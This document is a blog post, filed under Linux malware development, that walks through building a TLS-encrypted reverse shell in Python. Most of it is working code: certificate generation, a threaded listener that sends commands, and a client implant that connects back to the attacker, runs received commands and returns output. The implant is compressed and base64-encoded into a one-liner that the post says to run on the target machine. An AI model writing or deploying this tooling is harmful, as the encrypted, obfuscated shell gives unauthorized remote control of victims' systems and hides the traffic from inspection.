---
title: "Linux Malware Development: Building a TLS/SSL-Based Reverse Shell with Python"
date: 2024-11-30
header:
  teaser: "/assets/images/linux-maldev/tls-revers-shell.png"
categories:
  - blog
tags:
  - Linux-Malware-Development
  - TLS-Reverse-Shell
  - mohitdabas
---

Building a SSL/TLS Reverse Shell with Python

![tls-reverse-shell](/assets/images/linux-maldev/tls-revers-shell.png){:class="img-responsive"}

In this blog, we’ll walk through the process of building a **TLS-secured reverse shell** using Python. This reverse shell ensures that all communications between the client and server are encrypted using self-signed certificates. The code can be found here [Github Repo TLS reverse shell](https://github.com/MohitDabas/Linux_Malware_Development/blob/main/ssl_reverse_shell/reverse_ssl.py).


## **What is a Reverse Shell?**

A reverse shell is a type of remote shell where the target machine (client) connects back to an attacker's machine (server). The server can then execute commands on the client machine.

To make the communication secure, we'll use **TLS (Transport Layer Security)**, which encrypts all traffic between the server and client.



## **Key Features of the Code**

- **TLS Security**: Uses a self-signed certificate for encrypted communication.
- **Dynamic Client Code Generation**: Generates a single-line Python client script.
- **Threaded Server**: Handles multiple client connections using threads.
- **Regenerates Keys on Each Run**: Ensures fresh keys and certificates every time the script is executed.



## **Code Walkthrough**

### **1. Importing Dependencies**

```python
import os
import socket
import ssl
from subprocess import run, CalledProcessError
import base64
import zlib
from threading import Thread
```
### External dependencies for Server:
```bash
pip install pycryptodome
```


### Modules and Their Purpose

1. **`os`**  
   - **Purpose:** For file and directory operations.  
   - **Example Use:** Creating, deleting, or modifying files and directories.  

2. **`socket`**  
   - **Purpose:** For network communication.  
   - **Example Use:** Establishing a connection between a client and server over TCP/IP or UDP.  

3. **`ssl`**  
   - **Purpose:** For enabling TLS (encryption).  
   - **Example Use:** Securing data transferred between client and server to prevent interception.  

4. **`subprocess`**  
   - **Purpose:** To run system commands.  
   - **Example Use:** Executing shell commands or external programs from within Python.  

5. **`base64`** and **`zlib`**  
   - **Purpose:** To compress and encode the client code.  
   - **Example Use:**  
     - `zlib` compresses data to save bandwidth.  
     - `base64` encodes it for safe transmission over protocols that might not support raw binary.  

6. **`Thread`**  
   - **Purpose:** To handle multiple client connections concurrently.  
   - **Example Use:** Creating threads for each client in a multi-client server application to manage multiple connections simultaneously.


### **2. Generating Keys and Certificates**

```python
def keys_check_or_create(ip_address):
    keys_dir = "keys"
    os.makedirs(keys_dir, exist_ok=True)  # Ensure the keys directory exists

    # Remove existing keys and certificates
    for file in os.listdir(keys_dir):
        file_path = os.path.join(keys_dir, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
    print("[*] Existing keys and certificates removed.")

    # Generate RSA key pair
    from Crypto.PublicKey import RSA
    key = RSA.generate(2048)

    # Write the private key
    private_key_path = os.path.join(keys_dir, "private_key.pem")
    with open(private_key_path, "wb") as f:
        f.write(key.export_key())
    print("[*] Private key generated.")

    # Write the public key
    public_key_path = os.path.join(keys_dir, "public_key.pem")
    with open(public_key_path, "wb") as f:
        f.write(key.publickey().export_key())
    print("[*] Public key generated.")
```
This function:
Removes any old keys or certificates.
Generates a new RSA key pair and saves the private key and public key  in the keys folder.

### **3. Generating Self-Signed Certificate**
We use OpenSSL to create a self-signed certificate.

```python
def generate_certificate(private_key_path, cert_path, ip_address):
    openssl_config = "openssl.cnf"

    # Create OpenSSL configuration file
    with open(openssl_config, "w") as f:
        f.write(f"""
[ req ]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no

[ req_distinguished_name ]
C = US
ST = California
L = SanFrancisco
O = MyOrg
OU = IT
CN = {ip_address}

[ v3_req ]
subjectAltName = @alt_names

[ alt_names ]
IP.1 = {ip_address}
""")
```
The configuration file ensures the certificate is valid for the provided IP address using the Subject Alternative Name (SAN).
```python
    run([
        "openssl", "req", "-new", "-x509",
        "-key", private_key_path,
        "-out", cert_path,
        "-days", "365",
        "-config", openssl_config
    ], check=True)
    print("[*] OpenSSL: Certificate generated successfully.")

```

### **4. Generating Client Code**
The generate_and_compress_client_code function dynamically creates a reverse shell client script and compresses it into a one-liner.

```python
def generate_and_compress_client_code(ip, port):
    certfile = os.path.join("keys", "server.crt")
    with open(certfile, "r") as f:
        cert_content = f.read()

    client_code = f"""
import socket, ssl, subprocess
CERT=\"\"\"{cert_content}\"\"\"
def connect():
    context=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cadata=CERT)
    with socket.create_connection(("{ip}", {port})) as sock:
        with context.wrap_socket(sock, server_hostname="{ip}") as ssock:
            while True:
                cmd=ssock.recv(8192).decode()
                if cmd.lower()=="exit":break
                output=subprocess.getoutput(cmd)
                ssock.sendall(output.encode())
connect()
"""
```
**Compressing and encoding the client code:**

```python
    compressed_code = zlib.compress(client_code.encode())
    encoded_code = base64.b64encode(compressed_code).decode()
    return f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{encoded_code}')))"

```
### **5. Starting the Server**

```python
def start_server(ip, port=443):
    certfile, keyfile = keys_check_or_create(ip)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((ip, port))
        server_socket.listen(5)
        print(f"[*] Server listening on {ip}:{port}")

        with context.wrap_socket(server_socket, server_side=True) as tls_server:
            while True:
                client_socket, addr = tls_server.accept()
                print(f"[+] Connection from {addr}")
                Thread(target=handle_client, args=(client_socket,)).start()
```
The server:
1. Creates a TLS context with the generated certificate and private key.
2. Listens for client connections and handles each connection in a new thread.

### **6. Handling Client Commands**

```python
def handle_client(client_socket):
    buffer_size = 8192
    try:
        while True:
            command = input("Shell> ")
            if command.lower() in ["exit", "quit"]:
                client_socket.sendall(b"exit")
                break
            client_socket.sendall(command.encode())
            response = client_socket.recv(buffer_size).decode()
            print(response)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()
```
### **7. How to run**

1. **Start the server:**
```bash
python reverse_ssl.py
```
![tls-reverse-shell](/assets/images/linux-maldev/tls-revers-shell.png){:class="img-responsive"}

2. **Run the client script on the target machine:**
```bash
python -c "<compressed_client_code>"
```
![tls-reverse-shellclient](/assets/images/linux-maldev/tls-client.png){:class="img-responsive"}
